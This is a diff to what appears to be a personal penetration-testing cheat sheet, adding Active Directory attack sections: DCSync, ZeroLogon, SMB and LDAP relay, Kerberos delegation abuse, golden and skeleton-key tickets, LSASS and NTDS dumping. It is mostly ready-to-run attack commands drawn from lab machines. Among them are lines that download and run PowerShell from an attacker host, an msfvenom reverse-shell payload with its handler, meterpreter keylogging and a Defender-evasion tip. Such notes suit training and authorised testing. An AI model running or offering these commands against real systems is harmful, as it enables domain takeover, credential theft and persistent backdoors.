@@ -155,6 +155,7 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [FreeSWITCH](#freeswitch)
   - [Umbraco](#umbraco)
   - [VoIP penetration test](#voip-penetration-test)
+  - [DNS](#dns)
 - [Thick client vulnerabilities](#thick-client-vulnerabilities)
   - [DLL Hijacking](#dll-hijacking)
   - [Insecure application design](#insecure-application-design)
@@ -265,6 +266,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Mimikatz](#mimikatz-1)
     - [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
     - [Lateral Movement Techniques and Pivoting](#lateral-movement-techniques-and-pivoting)
+    - [Credentials Harvesting](#credentials-harvesting)
     - [Active Directory Persistence](#active-directory-persistence)
     - [Remote Desktop](#remote-desktop)
 - [Mobile](#mobile)
@@ -1591,6 +1593,7 @@ for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
 - [Wappalyzer](https://www.wappalyzer.com/)
 - [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
 - [BuiltWith](https://builtwith.com/)
+
 
 ### <ins>Port Scanning</ins>
 
@@ -3849,6 +3852,7 @@ Library files consist of three major parts written in XML to specify the paramet
 
 - Leverage ports 110 and 25
 - https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish
+
 **ODT**: https://www.exploit-db.com/exploits/44564
 - `python2 /usr/share/exploitdb/exploits/windows/local/44564.py`
 - `sudo responder -I tun0 -v`
@@ -4101,6 +4105,19 @@ If you have found a password
   - Find credentials
 - `sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav`
   - decrypt raw voip data
+
+
+### <ins>DNS</ins>
+
+**DNS zone transfer**
+- `dig axfr @<DNS_IP>`
+- `dig axfr @<DNS_IP> <DOMAIN>`
+- `fierce --domain <DOMAIN> --dns-servers <DNS_IP>`
+- `host -l domain.com nameserver`
+- `dnsrecon -d domain.com -a`
+- `dnsrecon -d domain.com -t axfr`
+- `dnsenum domain.com`
+- https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer
 
 
 ## Thick client vulnerabilities
@@ -5821,6 +5838,12 @@ Note: This attack works on Windows 7, 8, early versions of Windows 10, and their
   1. Copy the `PrintSpoofer.exe` exploit executable over the Windows machine
   2. `.\PrintSpoofer64.exe -i -c powershell.exe`
 
+**metasploit**
+- msfconsole, meterpreter > load incognito
+  - `list_tokens -u`
+  - `impersonate_token domain\\username`
+  - `rev2self <# to reverte to initial user, usefull when the initial user is the admin #>`
+
 #### <ins>getsystem</ins>
 - **Access Tokens**: When a user first logs in, this object is created and linked to their active session. A copy of the user's principal access token is added to the new process when they launch it.
 - **Impersonation Access Token**: When a process or thread momentarily needs to run with another user's security context, this object is created.
@@ -6248,6 +6271,9 @@ When you compromise a Domain Controller, you want to be able to get the ntds.dit
 - If you get lost, see the notes for the Hutch, Heist, and Vault machines
 - File config for responder: `/usr/share/responder/Responder.conf`
 - Do password spray only on local account
+  - `Rubeus.exe brute /password:Password1 /noticket`
+    - Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
+    - `echo 10.10.187.139 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
 - Kerberos Abuse: https://blog.spookysec.net/kerberos-abuse/
 - To transfer files use smbserver: `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
 - Certificate signing request for WinRM: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
@@ -6286,11 +6312,19 @@ When you compromise a Domain Controller, you want to be able to get the ntds.dit
 - The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`
 
 
+**Services that can be configured for delegation**
+- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
+- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
+- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
+- HOST - Allows delegation of account for all activities on the host.
+- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.
+
+
 **Basics commands**
 - Perform a password reset
-  Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+  - `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose`
 - Make user change password next logon
-  Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
+  - `Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose`
 
 
 #### <ins>Manual Enumeration</ins>
@@ -6313,7 +6347,7 @@ powershell -ep bypass                                                       bypa
 ([adsi]'').distinguishedName                                                obtain the DN for the domain
 ```
 
-#### <ins>PowerView</ins>
+#### PowerView
 
 ```
 Import-Module .\PowerView.ps1                                                                                                             Import PowerView; https://powersploit.readthedocs.io/en/latest/Recon/
@@ -6354,7 +6388,7 @@ Invoke-ShareFinder                                                              
 - See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993), [HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) and [HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
 
-#### <ins>From a compromised machine</ins>
+#### From a compromised machine
 MMC
   1. Search Bar > Type `mmc` and press enter
   2. See the steps for this app in https://tryhackme.com/room/adenumeration Task 3
@@ -6376,6 +6410,20 @@ PowerShell
   - `Get-ADDomain -Server za.tryhackme.com`
   - `Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
 BloodHound`
+
+#### More enumeration
+
+**AD User**
+- `Get-ADUser -identity s.smith -properties *`
+- If part of Audit Share, see the share `NETLOGON`
+- Check the value in `ScriptPath`, they should be available in `NETLOGON`
+
+**Kerberos user enumeration**
+- `/home/kali/Documents/windows-attack/active_directory/kerbrute/kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.159.49 usernames.txt`
+
+**Server Manager**
+- See event logs with: Event Viewer
+- Navigate to the tools tab and select the Active Directory Users and Computers
 
 #### <ins>Initial foothold</ins>
 - run `responder` + `mitm6`
@@ -6703,7 +6751,30 @@ To create a silver ticket, you need:
 4. Run `kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:<SERVICE> /rc4:<NTLM-HASH> /user:<USER>`
 5. Confirm that you have the ticket ready to use in memory with `klist`
 
-#### Domain Controller Synchronization
+**Another way to do it**
+1. `impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`
+2. `export KRB5CCNAME=$PWD/Administrator.ccache`
+3. `klist`
+4. `sudo nano /etc/krb5user.conf`
+5. `sudo echo '127.0.0.1       localhost nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM' >> /etc/hosts`
+6. `impacket-mssqlclient -k nagoya.nagoya-industries.com`
+   - `select system_user;`
+   - `SELECT * FROM OPENROWSET (BULK 'c:\users\administrator\desktop\proof.txt', SINGLE_CLOB) as correlation_name;`
+
+- Requirement: running in the context of service user (example `svc_mssql`)
+- MSSQL, verify if it's running in the context of service user
+  1. from kali: `impacket-smbserver -smb2support share /home/kali/Downloads/`
+  2. from mssql: `exec xp_dirtree '\\ATTACKERIP\share'`
+  3. from `impacket-smbserver`, see the user that tried to authenticate
+  - See 'Nagoya' from PG as an example
+- If you have a password, you can generate an NTHASH: https://codebeautify.org/ntlm-hash-generator?utm_content=cmp-true
+  - There are many tools for this purpose
+
+#### Domain Controller Synchronization (DCSync)
+
+With Bloodhound, use the query 'Find Principals with DCSync Rights'
+- Another way to see wich user can DCSync is to see who possesses 'Replication Righs' with `PowerView.ps1`
+  - `Get-ObjectACL "DC=htb,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }`
 
 On Linux
 1. `impacket-secretsdump -just-dc-user <target-user> <domain>/<user>:"<password>"@<IP>`
@@ -6712,6 +6783,320 @@ On Linux
 On Windows
 1. In mimikatz, run the command `lsadump::dcsync /user:<domain>\<user>`, note the Hash NTLM
 2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
+Another way
+- with [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161 -du neo4j -dp neo4j`
+
+Connect with NTLM
+- `evil-winrm -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175 -N`
+- `impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e`
+
+
+#### LDAP Pass-back attack
+
+If you find an endpoint where you can connect back to an arbitrary ldap server
+- run `nc -vlp 389`
+- Host a Rogue LDAP Server
+  1. `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
+  2. `sudo dpkg-reconfigure -p low slapd`
+  3. `nano olcSaslSecProps.ldif`
+  4. `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
+  5. Verify it: `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`
+
+
+#### ZeroLogon
+
+- Explanation of ZeroLogon: https://tryhackme.com/room/zer0logon
+
+STEP 1, CHOOSE ONE EXPLOIT
+- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/ZeroLogon by risksense/set_empty_pw.py' DC01 172.16.134.100`
+- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/CVE-2020-1472 Zerologon from SecuraBV/zerologon_tester.py' DC01 192.168.174.187`
+
+STEP 2
+- `impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'FABRICORP.LOCAL/FUSE$@10.10.10.193'`
+- `impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 MULTIMASTER\$@10.10.10.179`
+  - change only `'FABRICORP.LOCAL/FUSE$@10.10.10.193'` >> `DOMAIN/MACHINE$@IP`
+  - once secrets are dumped, select users with the following command
+    - `awk -F: '{print $1}' hashes.txt | sort | uniq`
+
+STEP 3
+- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
+- use also a pass the hash attack for administrator
+  - `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568 Administrator@10.10.169.118`
+
+STEP 4
+- RESTORATION: https://github.com/dirkjanm/CVE-2020-1472#restore-steps
+
+
+#### Responder SSRF
+
+- Setup Responder to create a spoofed WPAD proxy server
+  - `sudo responder -I tun0 -wv`
+  
+  
+#### LAPS and PXE
+
+- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
+- [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
+- [TryHackMe task 6 Breaching AD](https://tryhackme.com/room/breachingad)
+1. `tftp -i $IP GET "\Tmp\x64{39...28}.bcd" conf.bcd`
+2. `Import-Module .\PowerPXE.ps1`
+3. `$BCDFile = "conf.bcd"`
+4. `Get-WimFile -bcdFile $BCDFile`
+5. `tftp -i $IP GET "<PXE Boot Image Location>" pxeboot.wim`
+6. `Get-FindCredentials -WimFile pxeboot.wim`
+
+
+#### LLMNR Poisoning
+
+- It is possible that when you run nmap, or simply have traffic, you may receive communications. Use responders to capture hashes
+1. `sudo responder -I tun0 -rdwv`
+2. Listen to the traffic
+3. Get the hash
+4. crack the hash
+   - `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt -o cracked.txt -O`
+
+
+#### SMB Relay
+
+- Requirements for attack: SMB signing must be disabled on the target; Relayed user credentials must be admin on the machine.
+  - Discovery: `nmap --script=smb2-security-mode.nse -p445 192.168.220.0/24`
+1. Turn off SMB and HTTP from the file `/usr/share/responder/Responder.conf`
+2. `sudo responder -I tun0 -rdwv`
+3. `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`
+   - add the flag `-i` to get an interactive smb shell; connect with netcat `nc 127.0.0.1 1100`
+   - add the flag `-c` to run a command, like `whoami`
+   - add the flag `-e` to execute something, like a payload generated with msfvenom
+4. Capture SAM hashes
+
+
+#### IPv6 DNS Attacks
+
+1. `mitm6 -d domain.local`
+2. `sudo impacket-ntlmrelayx -6 -t ldaps://192.168.57.140 -wh fakewpad.domain.local -l lootme`
+   - `-t ldaps://DOMAIN-CONTROLLER-IP`; change only the ip in this command
+3. see the results in the directory 'lootme' for ntlmrelayx
+4. for mitm6, if an admin logs in, it might succed in creating a new user
+- See also: [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
+
+
+#### MFP Hacking
+
+- See: [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
+
+
+#### Dump hashes
+
+- `impacket-secretsdump spookysec/backup:backup2517860@10.10.3.105`
+- `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
+  - `SYSTEM` is also a file you have to get
+    - `SYSTEM` or `system.hive`
+- you can also run
+  1. `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > hashes.txt`
+  2. `cat hashes.txt | cut -d ':' -f 4 > pothashes.txt`
+  3. `gedit pothashes.txt`
+
+
+#### Microsoft password automation decrypt
+
+1. `$pw = "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" | ConvertTo-SecureString`
+2. `$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)`
+3. `$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)`
+4. `echo $UnsecurePassword`
+
+
+#### Full control / Write privileges over a template (ESC4)
+
+1. `certipy-ad req -username jodie.summers -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.234.30 -debug`
+2. `certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.234.30`
+
+
+#### WriteDACL
+
+- If you find that your user or the group wich your user is part of has this right, follow these steps
+1. `net user john abc123$ /add /domain`
+2. `net group "Exchange Windows Permissions" john /add`
+3. `net localgroup "Remote Management Users" john /add`
+4. `When using evil-winrm, run the command 'Bypass-4MSI' to evade defender`
+5. `iex(new-object net.webclient).downloadString('http://10.10.14.30/PowerView.ps1')`
+6. `$pass = convertto-securestring 'abc123$' -asplain -force`
+7. `$cred = new-object system.management.automation.pscredential('htb\john', $pass)`
+8. `Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync`
+9. Proceed with DCSync using `john:abc123$`
+
+
+#### Azure AD (AAD) Sync service
+
+- See: 
+  - https://blog.xpnsec.com/azuread-connect-for-redteam/
+  - https://github.com/dirkjanm/adconnectdump
+  - https://app.hackthebox.com/machines/223
+1. Extract password with [azuread_decrypt_msol.ps1](https://gist.github.com/analyticsearch/7453d22d737e46657eb57c44d5cf4cbb)
+2. If it doesn't work, retrieve `$key_id`, `$instance_id` and `$entropy` with the following command (see also [azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c))
+   - `sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"`
+
+
+#### Group Policy Preferences (GPP) AKA MS14-025
+
+1. `smbclient \\\\10.10.10.100\\Replication`
+2. `prompt off`
+3. `recurse on`
+4. `mget *`
+   - focus on the files: `Groups.xml`, `Registry.pol`, `GPE.INI`, `GptTmpl.inf`
+     - use the command `tree` to explore better the directory
+- `gpp-decrypt edBSH0whZlTJt/QS93jjcJ89mjWa89gc8guK0hK0dcqh+ZGMeX0sQbCiheijtlFCuNH9pG8sDVYdYw/NglVmQ`
+- read Registry.pol
+  - `regpol Registry.pol`
+  - `Parse-PolFile -Path Registry.pol`
+
+
+#### Dump NTDS.dit
+
+- No creds, access on DC: `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
+  - `root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`
+- Disk shadow, see: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-diskshadow
+- With credentials: `impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6`
+- More: https://www.hackingarticles.in/credential-dumping-ntds-dit/
+
+
+
+#### Exploiting Domain Trust
+
+1. With mimikatz, recover the KRBTGT password hash
+   - `privilege::debug`
+   - `lsadump::dcsync /user:za\krbtgt`
+2. With PowerShell, recover the SID of the child domain controller
+   - `Get-ADComputer -Identity "THMDC"`
+3. With PowerShell, recover the SID of the Enterprise Admins
+   - `Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc`
+4. With mimikatz, create forged TGT
+   - `kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt`
+5. Verify the golden ticket > after that you can use Rubeus.exe
+   - `dir \\thmdc.za.tryhackme.loc\c$`
+   
+
+#### AddMember + ForceChangePassword
+
+1. Add our AD account to the IT Support group
+   - `Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"`
+   - Verify the result with: `Get-ADGroupMember -Identity "IT Support"`
+   - At this point you should have inherited 'ForceChangePassword' Permission Delegation
+2. Identify the members of the group to select a target. Since the network is shared, it might be best to select one further down in the list
+   - `Get-ADGroupMember -Identity "Tier 2 Admins"`  
+3. `$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force`
+   - `Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password`
+
+- If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run 'gpupdate /force' and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
+- See [Exploiting AD Task 2](https://tryhackme.com/room/exploitingad)
+
+
+#### Automated Relays
+
+- With BloodHound, find instances where a computer has the "AdminTo" relationship over another computer
+  - `MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
+- A requirement is SMB signing enabled, check it with the following command
+  - `nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`
+Abuse Print Spooler Service
+- Determine if the Print Spooler service is running
+  - `GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc`
+- Set up NTLM relay
+  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -debug`
+  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug`
+- `SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`
+
+Keylogging
+
+1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1`
+2. `sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"`
+
+From the victim
+1. `certutil.exe -urlcache -split -f http://IP/shell.ps1`
+
+From Meterpreter
+1. `ps | grep "explorer"`
+2. `migrate PID`
+3. `getuid`
+4. `keyscan_start`
+5. `keyscan_dump`
+
+
+#### GenericAll
+
+[GenericAll on user](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-user)
+1. `. .\PowerView.ps1`
+2. `Get-ObjectAcl -SamAccountName L.Livingstone | ? {$_.ActiveDirectoryRights -eq "GenericAll"}`
+3. See GenericAll also in other ways and for groups
+
+[GenericAll on group](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-group)
+1. `Get-NetGroup "domain admins"`
+2. `Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=resourced,DC=local"}`
+3. `net group "domain admins" L.Livingstone /add /domain`
+
+Scenario: you can't access a shell with found credentials
+1. run `bloodhound.py`
+2. if you've found a GenericAll to a group that can PSremote, run the following command from 'ldeep' https://github.com/franc-pentest/ldeep
+   - `ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"`
+
+
+
+#### Kerberos Delegation
+
+Resourced Based Constrained Delegation attack
+- Requirement: GenericAll on system
+1. `impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.174.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'`
+2. `python3 /home/kali/Documents/windows-attack/Scripts/rbcd-attack/rbcd.py -dc-ip 192.168.174.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone`
+3. `impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.174.175`
+4. `export KRB5CCNAME=./Administrator.ccache`
+5. `sudo echo '192.168.174.175 resourcedc.resourced.local' >> /etc/hosts`
+6. `impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.174.175`
+
+Another way to do it
+1. Enumerate available delegations
+   - `Import-Module C:\Tools\PowerView.ps1`
+   - `Get-NetUser -TrustedToAuth`
+2. Get Administrator role, dump secrets to get passwords for target account
+   - `token::elevate`
+   - `lsadump::secrets`
+3. Exit mimikatz > enter Kekeo
+4. Generate a TGT to generate tickets for HTTP and WSMAN services
+   - `tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted`
+5. Forge TGS requests for the account we want to impersonate (for HTTP and WSMAN)
+   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc`
+   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
+6. Exit Kekeo > Open Mimikatz to import the TGS tickets
+   - `privilege::debug`
+   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
+   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
+7. Exit mimikatz, run `klist` to verify that everything went fine
+8. `New-PSSession -ComputerName thmserver1.za.tryhackme.loc`
+9. `Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`
+10. `whoami`
+
+
+#### Kerberos Backdoors / Kerberos Skeleton
+
+1. `privilege::debug`
+2. `misc::skeleton`
+Accessing the forest
+- the default password is 'mimikatz', some examples:
+  - `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
+  - `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
+
+
+#### Testing found credentials
+
+- `crackmapexec smb 192.168.174.187 -u usernames.txt -p passwords.txt --continue-on-success`
+  - test `impacket-psexec` on success
+- `crackmapexec winrm 192.168.212.165 -u users.txt -p passwords.txt --continue-on-success`
+  - test `evil-winrm` on success
+- `crackmapexec smb 192.168.174.187 -u usernames.txt -H hashes.txt --continue-on-success`
+  - test the found hashes
+- `runas.exe /netonly /user:<domain>\<username> cmd.exe`
+- `xfreerdp /u:bitbucket /p:littleredbucket /cert:ignore /v:10.10.187.9`
+- Note for post exploitation: you might find an `.xml` like `username.xml`. To test it:
+  1. `$Credential = Import-Clixml -Path ./username.xml`
+  2. `$Credential.GetNetworkCredential().password`
+  - The last commnad, try it even randomly before saving something in `$credential`, you never know
 
 
 #### <ins>Lateral Movement Techniques and Pivoting</ins>
@@ -6964,14 +7349,144 @@ Process
 3. `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")` reverse shell, run a listener with `nc -lnvp 443`
 
 
+### <ins>Credentials Harvesting</ins>
+
+#### Cedential Access
+
+
+Clear-text files
+- `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+Database files
+- `cd C:\ProgramData\McAfee\Agent\DB > ma.db > sqlitebrowser ma.db`
+- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/)
+
+Memory
+- Clear-text credentials
+- Cached Passwords
+- AD Tickets
+
+Password managers
+- example: `*.kdbx`
+
+Enterprise Vaults
+
+Active Directory
+- Users' description
+- Group Policy SYSVOL
+- NTDS
+- AD Attacks
+
+Network Sniffing
+
+Registry
+- `reg query HKLM /f password /t REG_SZ /s`
+- `reg query HKCU /f password /t REG_SZ /s`
+
+
+#### Windows Credentials
+
+- Keystrokes (keyscan_start / keyscan_stop)
+- `copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\`
+- `meterpreter > hashdump`
+
+Shadow Copy Service
+1. `wmic shadowcopy call create Volume='C:\'`
+2. `vssadmin list shadows`
+3. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam`
+4. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system`
+
+Registry Hives
+1. `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`
+2. `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`
+
+Now, you can decrypt
+- copy the files with `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
+- `impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL`
+
+
+#### Dump LSASS
+
+GUI
+1. Open Task Manager
+2. Search for `lsass.exe` > right click "Create dump file"
+3. `copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP`
+
+Mimikatz
+1. `privilege::debug`
+2. `sekurlsa::logonpasswords`
+
+Protected LSASS
+1. `privielege::debug`
+2. `!+`
+3. `!processprotect /process:lsass.exe /remove`
+4. `sekurlsa::logonpasswords`
+   
+   
+#### Accessing Credential Manager
+
+1. `vaultcmd /list`
+2. `VaultCmd /listproperties:"Web Credentials"`
+3. `VaultCmd /listcreds:"Web Credentials"`
+
+RunAs
+1. `cmdkey /list`
+2. If it's not empty
+   - `runas /savecred /user:THM.red\thm-local cmd.exe`
+   
+Mimikatz
+1. `privilege::debug`
+2. `sekurlsa::credman`
+
+
+#### Domain Controller
+
+1. `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
+2. `impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local`
+3. `impacket-secretsdump -just-dc THM.red/<AD_Admin_User>@10.10.153.149`
+   - `impacket-secretsdump -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.153.149`
+4. `hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`
+
+
+#### Local Administrator Password Solution (LAPS)
+
+1. Verify if there is LAPS in the machine
+   - `dir "C:\Program Files\LAPS\CSE"`
+2. `Get-Command *AdmPwd*`
+3. Find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS
+   - `Find-AdmPwdExtendedRights -Identity THMorg`
+   - `Find-AdmPwdExtendedRights -Identity *`
+4. Cheeck the group and its members
+   - `net groups "TARGET GROUP"`
+   - `net user test-admin`
+5. Compromise one of those accounts, get the password
+   - `runas.exe /netonly /user:bk-admin cmd.exe`
+   - `Get-AdmPwdPassword -ComputerName creds-harvestin`
+   
+#### Rubeus Harvesting
+
+- `Rubeus.exe harvest /interval:30`
+
+
 #### <ins>Active Directory Persistence</ins>
 
 #### Golden Ticket
 
-1. Run mimikatz, execute the command `privilege::debug`
-2. `lsadump::lsa /patch` dump the krbtgt password hash
-3. Run `kerberos::purge`
-4. `kerberos::golden /user:<USER> /domain:corp.com /sid:<SID> /krbtgt:<NTLM> /ptt` inject the golden ticket
+- With this attack, you can gain access to every machine in the AD
+- You need a kerberoast ticket granting account and With mimikatz from the DC
+- You may need to purge: `kerberos::purge`
+- See this if you are having trouble: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html
+
+Process
+1. `privilege::debug`
+2. Dump the krbtgt hash
+   - `lsadump::lsa /inject /name:krbtgt or `lsadump::lsa /patch`
+   - copy the SID and the NTLM
+3. `kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /ptt`
